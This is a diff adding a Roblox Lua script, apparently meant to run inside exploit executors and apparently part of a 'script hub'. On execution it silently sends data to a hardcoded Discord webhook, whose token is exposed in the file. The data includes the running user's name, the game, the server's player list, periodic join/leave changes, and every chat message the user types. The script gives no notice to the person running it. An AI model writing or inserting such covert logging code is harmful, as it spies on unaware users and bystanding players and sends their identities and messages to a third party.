@@ -1,0 +1,122 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1398217578421288960/cY6i2E5MSNvEC43F0POP6_Y7p-1rTi-GxZxzHyYnmgFfLRz-oq_8nOwm8kqGS81U-mcv"
+
+local requestFunc = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+if not requestFunc then
+	warn("No supported HTTP request function found.")
+	return
+end
+
+local lastPlayerList = {}
+
+local function sendEmbed(title, desc, color)
+	local payload = {
+		["embeds"] = {{
+			["title"] = title,
+			["description"] = desc,
+			["color"] = color or 0x00FFFF,
+			["footer"] = {
+				["text"] = "Script Hub Monitor"
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}}
+	}
+
+	local json = HttpService:JSONEncode(payload)
+
+	requestFunc({
+		Url = WEBHOOK_URL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = json
+	})
+end
+
+-- Get game info
+local function getGameName()
+	local success, info = pcall(function()
+		return MarketplaceService:GetProductInfo(game.PlaceId)
+	end)
+	return success and info.Name or "Unknown Game"
+end
+
+-- Get player names
+local function getPlayerNames()
+	local names = {}
+	for _, p in ipairs(Players:GetPlayers()) do
+		table.insert(names, p.Name)
+	end
+	return names
+end
+
+-- Initial embed on script run
+local function sendInitial()
+	local gameName = getGameName()
+	local currentPlayers = getPlayerNames()
+	lastPlayerList = currentPlayers
+
+	local desc = string.format("**User:** %s\n**Game:** [%s](https://www.roblox.com/games/%s)\n**Players:** %s\n**Time:** <t:%d:F>",
+		LocalPlayer.Name,
+		gameName,
+		tostring(game.PlaceId),
+		table.concat(currentPlayers, ", "),
+		math.floor(os.time())
+	)
+
+	sendEmbed("Script Executed", desc, 0x00FF00)
+end
+
+-- Compare player list every 3 minutes
+task.spawn(function()
+	while true do
+		task.wait(180)
+		local currentPlayers = getPlayerNames()
+
+		local joined, left = {}, {}
+		local check = {}
+
+		for _, name in ipairs(currentPlayers) do
+			check[name] = true
+			if not table.find(lastPlayerList, name) then
+				table.insert(joined, name)
+			end
+		end
+
+		for _, name in ipairs(lastPlayerList) do
+			if not check[name] then
+				table.insert(left, name)
+			end
+		end
+
+		if #joined > 0 or #left > 0 then
+			local msg = ""
+			if #joined > 0 then
+				msg = msg .. "**+ Joined:** " .. table.concat(joined, ", ") .. "\n"
+			end
+			if #left > 0 then
+				msg = msg .. "**– Left:** " .. table.concat(left, ", ")
+			end
+			sendEmbed("Player Change", msg, 0xFFA500)
+		end
+
+		lastPlayerList = currentPlayers
+	end
+end)
+
+-- Chat listener
+LocalPlayer.Chatted:Connect(function(msg)
+	local cleanMsg = msg:sub(1, 250):gsub("`", "") -- prevent markdown abuse
+	local desc = string.format("**%s:** %s", LocalPlayer.Name, cleanMsg)
+	sendEmbed("Chat Message", desc, 0x0000FF)
+end)
+
+-- Run it
+sendInitial()
